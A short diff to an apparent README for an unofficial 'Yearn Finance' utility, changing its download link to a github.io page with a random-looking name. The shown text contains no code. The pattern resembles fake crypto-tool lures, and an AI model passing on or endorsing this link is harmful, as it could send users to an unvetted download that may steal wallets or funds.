@@ -34,4 +34,4 @@ A: No. This is an open-source, community-developed utility for Yearn Finance. It
 
 ## Download
 
-[Get it here](https://yellowtaxisave.github.io/download-page/)
+[Get it here](https://capitals-707-bringing.github.io/download-page/)
